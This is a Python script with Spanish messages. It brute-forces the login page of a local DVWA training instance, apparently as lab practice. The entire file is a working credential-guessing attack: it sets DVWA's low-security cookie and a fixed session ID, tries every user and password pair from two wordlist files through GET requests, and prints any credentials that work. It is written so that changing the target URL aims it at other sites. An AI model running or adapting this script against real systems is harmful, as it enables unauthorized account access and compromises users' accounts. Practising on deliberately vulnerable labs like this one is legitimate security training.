import requests
import urllib.parse
from pathlib import Path
import sys


BASE = "http://127.0.0.1:4280"
PATH = "/vulnerabilities/brute/"
USERS_FILE = "users.txt"
PASSWORDS_FILE = "passwords.txt"
FAILURE_STRING = "Username and/or password incorrect"
FAILURE_URL_FRAGMENT = "login.php"
PHPSESSID_FIXED = "016c0d46659400e0083125927787d567"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (brute-script)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}


def load_list_simple(path):
    p = Path(path)
    if not p.exists():
        raise SystemExit(f"ERROR: no existe {path}")
    raw_lines = p.read_text(encoding="utf-8", errors="ignore").splitlines()
    return [line if line is not None else "" for line in raw_lines]

def attempt(session, user, pwd):
    params = {"username": user, "password": pwd, "Login": "Login"}
    url = urllib.parse.urljoin(BASE, PATH)
    try:
        resp = session.get(url, params=params, allow_redirects=True, timeout=15)
    except Exception as e:
        return False, {"error": str(e)}
    body = resp.text or ""
    final_url = resp.url or ""
    if FAILURE_STRING and FAILURE_STRING.lower() in body.lower():
        return False, {"status_code": resp.status_code, "final_url": final_url, "reason": "failure_string"}
    if FAILURE_URL_FRAGMENT and FAILURE_URL_FRAGMENT.lower() in final_url.lower():
        return False, {"status_code": resp.status_code, "final_url": final_url, "reason": "failure_url_redirect"}
    info = {
        "status_code": resp.status_code,
        "final_url": final_url,
        "cookies": session.cookies.get_dict(),
        "body_snippet": (body[:300].replace("\n", " ").replace("\r", " "))
    }
    return True, info

def main():
    users = load_list_simple(USERS_FILE)
    passwords = load_list_simple(PASSWORDS_FILE)

    if not users:
        print(f"ERROR: {USERS_FILE} está vacío o no existe.", file=sys.stderr)
        return
    if not passwords:
        print(f"ERROR: {PASSWORDS_FILE} está vacío o no existe.", file=sys.stderr)
        return

    session = requests.Session()
    session.headers.update({"User-Agent": HEADERS["User-Agent"], "Accept": HEADERS["Accept"]})

    # Establecer security=low y fijar PHPSESSID inline si se definió
    session.cookies.update({"security": "low"})
    if PHPSESSID_FIXED and PHPSESSID_FIXED.strip():
        session.cookies.update({"PHPSESSID": PHPSESSID_FIXED.strip()})
        print(f"[*] PHPSESSID fijado en el script: {PHPSESSID_FIXED.strip()}")
    else:
        print("[*] No se fijó PHPSESSID en el script; la sesión se creará automáticamente.")

    # Petición inicial
    try:
        r0 = session.get(urllib.parse.urljoin(BASE, PATH), timeout=8)
        print(f"[*] Petición inicial: status={r0.status_code}, url={r0.url}")
        print(f"[*] Cookies actuales: {session.cookies.get_dict()}")
    except Exception as e:
        print("[!] Falló petición inicial:", e)

    found = []
    total = len(users) * len(passwords)
    tried = 0
    print(f"\n[+] Empezando brute force (GET) contra {BASE}{PATH}")
    print(f"[+] Usuarios: {len(users)}, contraseñas: {len(passwords)}, intentos totales aproximados: {total}\n")

    for u in users:
        for p in passwords:
            tried += 1
            print(f"[{tried}/{total}] Probando '{u}':'{p}' ... ", end="", flush=True)
            success, info = attempt(session, u, p)
            if success:
                print("¡ENCONTRADO!")
                found.append((u, p, info))
            else:
                reason = info.get("reason") if isinstance(info, dict) else str(info)
                print(f"fallo ({reason})")

    print("\n=== Resultado final ===")
    if found:
        for u, p, info in found:
            print(f"FOUND -> {u}:{p}   (status={info.get('status_code')} url={info.get('final_url')})")
    else:
        print("\n[-] No se encontraron credenciales con las listas proporcionadas.")

if __name__ == "__main__":
    main()